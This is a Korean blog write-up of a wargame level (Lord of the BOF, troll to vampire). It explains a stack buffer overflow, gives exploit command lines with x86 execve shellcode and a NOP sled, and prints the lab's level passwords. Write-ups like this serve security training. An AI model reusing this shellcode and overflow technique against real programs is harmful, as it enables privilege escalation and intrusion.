---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL9 (troll -> vampire) : check 0xbfff"
date: 2015-11-13 22:30
comments: true
categories:  wargame
tags: [bof]
---

- id = troll 
- pw = aspirin

<!--more-->

## 1. 문제 : vampire.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
} 
```

### 1.1 변경 사항

이번에 추가된 제약사항은 `LR` 값이 현재 stack 위치이므로 `0xbfff----` 이므로 항상 `0xbf` `0xff` 값이 들어가게 되는데, 이때 `0xff` 값을 넣지 못하는 제약사항이다.

```c
        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }
```

## 2. 공격 방법 고민

현재 stack 이 `0xbfff----` 부근에 설정이 되고 있어서 `$LR` 값이 `0xbfff----` 로 설정이 되는데, 이 값을 사용 할 수 없다면 ?

### 2.1 LR 값을 수정

실제 값은 `0xbf`, `0xff` 를 사용하지만 다른 값을 넣은 다음에 shellcode 에서 이 값을 수정해서 `0xff` 가 되도록 한다 ? 가능할 수도 있겠지만 아직 shellcode 를 마음대로 작성할 수준은 안 되서 일단 패스…

### 2.2 Stack 이 0xbfff 가 아닌 곳에 잡히도록 설정

이전 문제 경험에 의하면 함수가 실행되기 위해서는 argument pararameter passing 을 위하여 이 값이 main function 아래에 stack 에 잡히게 된다. 이 argument에 매우 긴 값을 넣으며 그만큼 stack 은 위에 잡히게 되어 `0xbfff` 가 아니라 그 위 주소에 설정되도록 할 수 있지 않을까 ?

#### 2.2.1 NOP 50개 ==> 0xbffffdd8

```bash
`python -c 'print "A"*44 + "\x94\xfb\xf0\xbf"'`  `python -c 'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
```

#### 2.2.2 NOP 350개 ==> 0xbffffcac

```bash
`python -c 'print "A"*44 + "\x94\xfb\xf0\xbf"'`  `python -c 'print "\x90"*350 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
```

`argv[2]` 에 NOP 를 300개 추가하자 stack 위치가 정확하게 300bytes 만큼 올라가서 잡힌다. :)

## 3. 공격

argument 에 긴 값을 넣어서 stack 이 `0xbfff----` 위에 잡힐 수 있도록 공격을 해보자.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage9-1.png)
![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage9-3.png)

NOP 중에서 `0xbffe7648`을 `LR` 로 이용하여 공격.

```bash
./vampire `python -c 'print "A"*44 + "\x48\x76\xfe\xbf"'`  `python -c 'print "\x90"*350 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A"*100000'`                                                                      
bash: /home/troll/.bashrc: Permission denied

bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
```

## 4. 다음 단계 정보

실제 exploit 을 위해서는 명령실행환경에서의 `agv[0]`의 위치를 정확하게 알아야 한다. 

```bash
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)

bash$ my-pass
euid = 509
music world
```